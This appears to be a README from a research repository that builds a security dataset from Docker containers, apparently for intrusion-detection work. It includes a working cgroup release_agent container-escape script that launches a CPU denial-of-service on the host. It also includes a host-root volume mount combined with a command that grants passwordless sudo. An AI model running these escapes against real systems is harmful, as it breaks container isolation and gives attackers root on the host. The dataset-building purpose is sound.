# Containers
There are five containers used to create the dataset.

* denial of service container
* privilege escalation container
* prometheus database container
* grafana web server container
* internet of things container

The denial of service and privilege escalation were derived from the following.

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

The prometheus and grafana are from awesome-compose.  Finally, the internet of things container was developed to communicate with remote endpoints, however, due to the size and specialized configuration, it is not provided.

The following sections describe each of the containers.


## Denial of Service Container

The denial of service container launches a container escape and associated denial of service attack.

* You can load the pre-confgured container as follows.

```bash
docker load < umbrella_ubuntu_dos.tar.gz
```

* You can create and configure new container.

To create and configure a new container follow the below steps.

Get the latest ubuntu image

```bash
docker pull ubuntu
```

Using original ubuntu, install nano, add escape.sh and stress.txt (see below), then commit to save the container configuration.

```bash
docker run --privileged --name=ESCAPE_DOS --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```

From within container

```bash
apt-get update
apt-get install nano
nano escape.sh
...
(save)
chmod +x escape.sh

nano stress.txt
...
(save)
```

In another host terminal, save currently running ubuntu container to ubuntu_escape image.

```bash
docker commit ESCAPE_DOS ubuntu_escape
```

You can now exit the ubuntu container.

From a host terminal, start the ubuntu_escape container with reduced security.

```bash
docker run --name=ESCAPE_DOS --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu_escape bash
```

Finally, from other host terminal, execute escape.sh in ubuntu_escape.  This launches the attack (you can use top to see the increased CPU usage).  Note that [scenarioDos.py](../src/scenarioDos.py) uses this to launch the attack.
```bash
docker exec -it ESCAPE_DOS /escape.sh
```

### Escape

The contents of the escape.sh file should be as follows.

```bash
#!/bin/sh
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup_memory /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat stress.txt > /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Attack

The contents of the stress.txt file should be as follows.

```bash
#!/bin/bash
stress() {
  (
    pids=""
    cpus=${1:-1}
    seconds=${2:-60}
    echo loading $cpus CPUs for $seconds seconds
    trap 'for p in $pids; do kill $p; done' 0
    for ((i=0;i<cpus;i++)); do while : ; do : ; done & pids="$pids $!"; done
    sleep $seconds
  )
}
stress 2 20
```

## Privilege Escalation Container

The privilege escalation container launches a container escape and associated privilege escalation attack.

* You can load the pre-confgured container as follows.

```bash
docker load < umbrella_alpine_privesc.tar.gz
```

* You can create and configure a new container.

To create and configure a new container follow the below steps.

Create container from alpine image.

### Escape

The privilege escape is really accomplished by the mounting of a volume during container building.

```
FROM alpine
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
VOLUME $WORKDIR
WORKDIR $WORKDIR
```

Execute the following command to build container.

```bash
docker build -t priv-container .
```

You can execute the following command to run the container.  Note that this is done in the [scenarioPrivesc.py](../src/scenarioPrivesc.py).

```bash
docker run --name ESCAPE_PRIVESC -v /:/privesc -it priv-container /bin/sh
```

### Attack

The attack assumes the user *testuser* aleady exists.  The *testuser* should be in the sudo'ers list but requires a password (the attack changes this to password-less).  From within the container, the following is executed.

```bash
echo "testuser ALL=(ALL) NOPASSWD: ALL" > /privesc/etc/sudoers.d/010_testuser-nopasswd
```


## Prometheus-Grafana Container

The prometheus-grafana container is take from awesome-compose and can be started and stopped with the following.  Note that this is done in the [scenarioGrafana.py](../src/scenarioGrafana.py).

```bash
sudo docker-compose -f prometheus-grafana/docker-compose.yml up --no-start
sudo docker-compose -f prometheus-grafana/docker-compose.yml start
```

```bash
sudo docker-compose -f prometheus-grafana/docker-compose.yml stop
sudo docker-compose -f prometheus-grafana/docker-compose.yml rm -f
```

## Internet of Things Container

The IoT container used for the datasets is described here.  We do not provide the container because it exceeded github's maximum file size.

The IoT container is based on the ubuntu image.  It was then configured to setup the tunslip interface to communicate with an IEEE 802.15.4 wireless dongle over /tty/ACM0.  The dongle is programmed with the contiki-ng rpl-border-router example using TSCH.

The remote endpoints are the Nordic nRF-52480 development boards programmed with the contiki-ng rpl-udp example using TSCH.  The endpoints take a temperature sensor reading every five seconds and send to the UDP server (port 8765) running in the Docker IoT container.

This container setup works for both the Umbrella edge device (built-in nRF dongle) and the Linux Raspian VM (USB attached nRF dongle).
